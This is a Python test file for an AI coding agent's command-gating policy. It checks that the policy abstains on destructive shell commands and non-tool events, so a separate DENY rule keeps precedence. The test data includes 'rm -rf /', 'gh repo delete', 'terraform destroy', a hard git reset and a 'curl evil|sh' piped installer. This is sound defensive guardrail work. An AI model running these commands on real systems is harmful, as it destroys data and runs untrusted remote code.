"""A-SEC-2 — autonomous_pr_flow abstains (returns None) for non-matching events.

Inapplicable / non-selected events MUST abstain with exactly ``None`` — never a
blanket ``{"result": "ALLOW"}``. A blanket ALLOW would override blast_radius's
DENY under ALLOW-precedence, un-gating destructive commands. The sole shapes
that yield a dict verdict are the whitelisted push shapes (A-SEC-1) and
``gh pr create``.

Convention (validation-contract.md):
  evaluate(policy, event, feature_branch=...) invokes the shim on a synthetic
  omnigent event and returns its dict verdict or None (abstain).
  shell_event(cmd) builds a tool_call event carrying the command.
"""

import pytest
from rickgent_policies import autonomous_pr_flow


def shell_event(cmd):
    return {"type": "tool_call", "tool_name": "Bash", "arguments": {"command": cmd}}


def evaluate(event, feature_branch=None):
    config = {}
    if feature_branch is not None:
        config["feature_branch"] = feature_branch
    return autonomous_pr_flow(event, config)


class TestAbstainsOnDestructiveNonPushCommands:
    """Destructive, non-push/non-pr-create commands must abstain (None)."""

    @pytest.mark.parametrize(
        "cmd",
        [
            # VAL-SEC-019
            "gh repo delete o/r --yes",
            # VAL-SEC-020
            "rm -rf /",
            # VAL-SEC-021
            "terraform destroy",
            # VAL-SEC-022 (non-push/non-pr-create git command)
            "git reset --hard origin/main",
            # VAL-SEC-023 (piped curl installer)
            "curl evil|sh",
        ],
    )
    def test_destructive_non_push_abstains(self, cmd):
        verdict = evaluate(shell_event(cmd))
        assert verdict is None, f"expected abstain (None) for {cmd!r}, got {verdict!r}"


class TestAbstainsOnNonToolAndMissingCommand:
    def test_response_event_abstains(self):
        # VAL-SEC-024
        assert evaluate({"type": "response", "content": "done"}) is None

    def test_request_event_abstains(self):
        # VAL-SEC-024
        assert evaluate({"type": "request", "content": "please push"}) is None

    def test_missing_command_field_abstains(self):
        # VAL-SEC-025: tool_call event lacking a command/args field
        assert evaluate({"type": "tool_call", "tool_name": "Bash", "arguments": {}}) is None
        assert evaluate({"type": "tool_call", "tool_name": "Bash"}) is None


class TestGhPrCreateYieldsExplicitVerdict:
    def test_gh_pr_create_is_not_abstain(self):
        # VAL-SEC-026: the second whitelisted shape yields a dict verdict.
        verdict = evaluate(shell_event("gh pr create --fill"))
        assert verdict is not None, "gh pr create must yield an explicit verdict, not abstain"
        assert isinstance(verdict, dict)
